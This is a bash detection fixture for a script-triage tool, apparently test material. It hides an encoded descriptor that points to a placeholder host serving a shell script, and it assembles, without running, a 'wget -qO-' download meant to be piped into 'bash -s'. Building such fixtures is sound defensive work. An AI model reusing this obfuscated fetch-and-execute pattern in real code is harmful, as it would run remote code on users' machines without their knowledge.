#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_7b2494a7='%7c%43%37%82%79%7a%6b%76%79%43%67%69%77%7b%6f%78%6b%65%78%6b%73%75%7a%6b%32%6a%6f%79%76%67%7a%69%6e%65%76%6f%76%6b%82%67%6a%67%76%7a%6b%78%43%7d%6d%6b%7a%65%79%7a%6a%75%7b%7a%65%76%6f%76%6b%82%79%7a%67%6d%6b%65%69%75%7b%74%7a%43%37%82%69%67%73%76%67%6f%6d%74%65%6f%6a%43%69%67%73%76%67%6f%6d%74%33%36%37%67%68%36%3c%3c%36%3a%6a%82%7b%78%72%43%6e%7a%7a%76%79%40%35%35%36%37%67%68%36%3c%3c%36%3a%6a%34%6b%7e%67%73%76%72%6b%34%6f%74%7c%67%72%6f%6a%35%3a%3d%6a%38%6c%37%3a%6b%34%79%6e%82%7b%79%6b%78%65%67%6d%6b%74%7a%43%4e%7b%74%7a%78%6b%79%79%52%67%68%35%36%37%67%68%36%3c%3c%36%3a%6a'
  readonly Codec_7b2494a7='percent_hex|add_modulo_256|06'

  Load_7b2494a7() {
    item1=()
    local raw="${Material_7b2494a7}" item6
    for item6 in ${raw//%/ }; do [[ -n "$item6" ]] && item1+=("$((16#$item6))"); done
  }

  Decode_7b2494a7() {
    item2=()
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$(((item1[item5] - 6 + 256) % 256))")
    done
  }

  Recover_7b2494a7() {
    local -a item1 item2
    local item3 item4 item8 item5
    item4="${HUNTRESS_FIXTURE_CONTEXT:-host}"
    Load_7b2494a7
    Decode_7b2494a7
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_7b2494a7() { Recover_7b2494a7; }

  Plan_7b2494a7() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_7b2494a7)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_7b2494a7; fi
